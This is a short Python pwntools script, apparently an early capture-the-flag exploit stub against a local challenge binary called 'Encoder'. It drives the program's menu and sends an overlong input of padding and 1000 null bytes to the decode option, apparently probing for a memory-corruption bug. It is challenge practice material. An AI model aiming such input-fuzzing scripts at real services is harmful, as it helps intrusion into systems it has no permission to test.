from pwn import *

debug = True

if (debug == True):
    io = process('./Encoder')
else:
    io = remote('0.0.0.0', 0)


def encode(x_input):
    print io.recv()
    io.sendline('1')
    print io.recv()
    io.send(x_input)

def decode(x_input):
    print io.recv()
    io.sendline('2')
    print io.recv()
    pause()
    io.send(x_input)

def to_dbg_mode():
    print io.recv()
    io.sendline('4')

to_dbg_mode()
decode('aaaaaaaa'+1000*'\0'+'\n')
print io.recvall()

